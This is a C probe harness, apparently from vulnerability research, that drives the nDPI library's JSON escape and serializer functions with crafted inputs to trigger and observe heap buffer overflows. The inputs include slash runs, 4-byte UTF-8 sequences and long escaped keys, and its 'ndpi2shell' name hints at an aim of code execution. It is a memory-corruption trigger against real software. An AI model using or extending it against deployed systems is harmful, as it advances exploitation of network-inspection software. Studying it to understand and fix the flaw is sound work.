/*
 * ndpi2shell real-library probe (W162).
 * Mode "direct": call the public ndpi_json_string_escape with an exact-size
 *   heap buffer (the advisory/direct-call condition).
 * Mode "real": drive the real JSON serializer with crafted strings so the
 *   in-tree caller allocates the destination and computes dst_max_len.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ndpi_api.h"

static void dump(const char *tag, const unsigned char *p, int n) {
  int i;
  printf("%s:", tag);
  for(i = 0; i < n; i++) printf(" %02x", p[i]);
  printf("\n");
}

static void run_direct(const char *label, const unsigned char *src, int slen) {
  char *dst = (char *)malloc(8);           /* exact-size caller buffer */
  int rc;
  memset(dst, 0xa5, 8);
  printf("DIRECT %s slen=%d\n", label, slen);
  fflush(stdout);
  rc = ndpi_json_string_escape((const char *)src, slen, dst, 8);
  printf("DIRECT %s rc=%d\n", label, rc);
  dump("DIRECT tail", (unsigned char *)dst, 8);
  free(dst);
}

static void run_real(const char *label, unsigned bufsize,
                     const unsigned char *src, int slen, int use_len) {
  ndpi_serializer s;
  int rc = ndpi_init_serializer_ll(&s, ndpi_serialization_format_json, bufsize);
  if(rc != 0) { printf("REAL %s bufsize=%u INITFAIL=%d\n", label, bufsize, rc); return; }
  printf("REAL %s bufsize=%u slen=%d use_len=%d\n", label, bufsize, slen, use_len);
  fflush(stdout);
  if(use_len)
    rc = ndpi_serialize_string_string_len(&s, "key", (const char *)src, (u_int16_t)slen);
  else
    rc = ndpi_serialize_string_string(&s, "key", (const char *)src);
  printf("REAL %s bufsize=%u rc=%d\n", label, bufsize, rc);
  {
    u_int32_t blen = 0;
    char *buf = (char *)ndpi_serializer_get_buffer(&s, &blen);
    printf("REAL %s outlen=%u\n", label, blen);
    if(buf && blen > 0 && blen <= 96) dump("REAL out", (unsigned char *)buf, (int)blen);
  }
  ndpi_term_serializer(&s);
}

static void run_weakkey(const char *label, int klen, unsigned bufsize, int which) {
  ndpi_serializer s;
  unsigned char *key = (unsigned char *)malloc(klen + 1);
  int rc;
  memset(key, '/', klen);            /* 2-byte JSON escape, never numeric */
  key[klen] = 0;
  rc = ndpi_init_serializer_ll(&s, ndpi_serialization_format_json, bufsize);
  if(rc != 0) { printf("WEAK %s klen=%d bufsize=%u INITFAIL=%d\n", label, klen, bufsize, rc); free(key); return; }
  printf("WEAK %s klen=%d bufsize=%u which=%d\n", label, klen, bufsize, which);
  fflush(stdout);
  if(which == 0)
    rc = ndpi_serialize_start_of_block_binary(&s, (const char *)key, (u_int16_t)klen);
  else if(which == 1)
    rc = ndpi_serialize_start_of_list_binary(&s, (const char *)key, (u_int16_t)klen);
  else
    rc = ndpi_serialize_binary_boolean(&s, (const char *)key, (u_int16_t)klen, 1);
  printf("WEAK %s klen=%d rc=%d\n", label, klen, rc);
  fflush(stdout);
  ndpi_term_serializer(&s);
  free(key);
}

int main(int argc, char **argv) {
  unsigned char src[8192];
  int i, slen;
  const char *mode = (argc > 1) ? argv[1] : "all";
  /* pattern 1: all '/' -> 2x expansion via 2-byte escapes */
  memset(src, '/', sizeof(src));
  if(strcmp(mode, "direct") == 0 || strcmp(mode, "all") == 0) {
    run_direct("slash7", src, 7);
    run_direct("slash50", src, 50);
    /* pattern 2: repeated 4-byte UTF-8 F0 90 80 80 */
    for(i = 0; i + 3 < (int)sizeof(src); i += 4) {
      src[i] = 0xF0; src[i+1] = 0x90; src[i+2] = 0x80; src[i+3] = 0x80;
    }
    run_direct("utf8-4x8", src, 32);
  }

  if(strcmp(mode, "real") == 0 || strcmp(mode, "all") == 0) {
    unsigned sizes[] = {8, 16, 32, 64, 128};
    unsigned si;
    /* slash pattern */
    for(si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++)
      for(slen = 1; slen <= 2000; slen *= 2)
        run_real("slash", sizes[si], src, slen, 1);
    /* utf8 pattern */
    for(i = 0; i + 3 < (int)sizeof(src); i += 4) {
      src[i] = 0xF0; src[i+1] = 0x90; src[i+2] = 0x80; src[i+3] = 0x80;
    }
    for(si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++)
      for(slen = 4; slen <= 2000; slen *= 2)
        run_real("utf8", sizes[si], src, slen, 1);
    /* mixed escapes many patterns */
    for(i = 0; i < (int)sizeof(src); i++) {
      const unsigned char pat[] = { '/', '"', '\\', '\n', '\t', 0xF0, 0x90, 0x80, 0x80 };
      src[i] = pat[i % sizeof(pat)];
    }
    for(si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++)
      for(slen = 9; slen <= 2000; slen *= 2)
        run_real("mixed", sizes[si], src, slen, 1);
    /* strlen-based (untrusted NUL-terminated string, as parsers supply) */
    src[1000] = 0;
    for(si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++)
      run_real("strlen", sizes[si], src, 1000, 0);
  }
  if(strcmp(mode, "weakkey") == 0 || strcmp(mode, "all") == 0) {
    int klens[] = {32, 256, 1024, 1400, 2048, 8192};
    unsigned bufs[] = {256, 1024};
    unsigned bi;
    int wi, ki;
    for(bi = 0; bi < sizeof(bufs)/sizeof(bufs[0]); bi++)
      for(ki = 0; ki < sizeof(klens)/sizeof(klens[0]); ki++)
        for(wi = 0; wi < 3; wi++)
          run_weakkey("weak", klens[ki], bufs[bi], wi);
  }
  if(strcmp(mode, "weakone") == 0 && argc >= 5) {
    run_weakkey("one", atoi(argv[2]), (unsigned)atoi(argv[3]), atoi(argv[4]));
  }
  printf("DONE mode=%s\n", mode);
  return 0;
}
